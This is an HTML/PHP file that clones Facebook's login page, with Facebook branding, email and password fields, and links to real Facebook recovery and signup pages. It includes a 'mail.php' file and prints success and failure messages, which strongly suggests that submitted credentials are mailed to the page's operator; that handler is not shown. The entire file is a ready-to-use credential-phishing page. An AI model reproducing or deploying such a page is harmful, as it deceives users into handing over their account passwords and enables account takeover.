<!- connect with php file ->
<?php include 'mail.php' ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook-log in or sign up</title>
    <link rel="icon" href="icon/icons8-facebook-48.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <form action="">
                <input type="text" name="email" id="email" placeholder="Email addess or phone number" required>
                <input type="password" name="password" placeholder="Password" id="password" required>
                <button type="submit" name="submit" id="data-submit" class="loginBtn">Log In</button>
                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget">Forgotten password?</a>
                <div class="sign-up">
                    <a href="https://m.facebook.com/reg/?ref=dbl&soft=hjk" class="signupBtn">Create New Account</a>
                </div>
            </form>
            <div>
                <p class="sucess"> <?php echo $success; ?> </p>
                <p class="failed"> <?php echo $failed; ?> </p>
            </div>
            <p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="create"><b>Create a Page</b> </a> for a celebrity, band or business.</p>
        </div>
    </div>
</body>
</html>